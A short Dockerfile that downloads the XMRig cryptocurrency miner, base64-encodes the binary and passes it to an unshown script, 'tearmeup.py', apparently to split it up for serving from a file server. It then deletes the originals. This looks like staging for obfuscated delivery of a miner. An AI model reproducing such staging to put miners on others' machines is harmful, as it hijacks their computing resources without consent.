FROM debian:latest
RUN apt update -y
RUN apt install wget python3 -y

ARG XMRVERSION=6.21.3

WORKDIR "/root/build/"
RUN wget -c https://github.com/xmrig/xmrig/releases/download/v$XMRVERSION/xmrig-$XMRVERSION-linux-static-x64.tar.gz -O /tmp/xmrig-$XMRVERSION-linux-static-x64.tar.gz
RUN tar -zxvf /tmp/xmrig-$XMRVERSION-linux-static-x64.tar.gz
RUN cp xmrig-$XMRVERSION/xmrig .
RUN rm -rf xmrig-$XMRVERSION/
RUN cat xmrig| base64 > xmrig.b64
COPY fileserver/tearmeup.py .
RUN chmod 755 tearmeup.py
RUN ./tearmeup.py xmrig.b64
RUN rm xmrig && rm xmrig.b64 && rm tearmeup.py
